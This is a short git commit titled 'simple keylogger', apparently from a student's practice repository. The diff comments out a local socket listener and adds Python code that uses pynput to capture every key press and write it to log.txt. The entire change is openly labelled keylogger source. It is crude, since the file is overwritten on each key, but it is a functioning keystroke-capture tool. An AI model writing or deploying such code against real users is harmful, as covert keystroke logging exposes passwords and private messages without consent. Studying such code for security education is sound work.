e75a87156c14ed2b6736517b968f79874d8610db
laevad <aldave.tabian@ustp.edu.ph>
2021-03-02 20:16:33 -0500

    simple keylogger

--- keylogger1.py
+++ keylogger1.py
@@ -1,12 +1,24 @@
 #!/usr/bin/python
-import socket
+#import socket
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind(("127.0.0.1", 54321))
-s.listen(5)
-print("listening for incoming connection")
-target, ip = s.accept()
-print("Target Connected")
-s.close()
+#s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+#s.bind(("127.0.0.1", 54321))
+#s.listen(5)
+#print("listening for incoming connection")
+#target, ip = s.accept()
+#print("Target Connected")
+#s.close()
+# ==============
+import pynput.keyboard
+
+
+def process_keys(key):
+    with open("log.txt", "w") as fin:
+        fin.write(str(key))
+
+
+keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
+with keyboard_listener:
+    keyboard_listener.join()
 
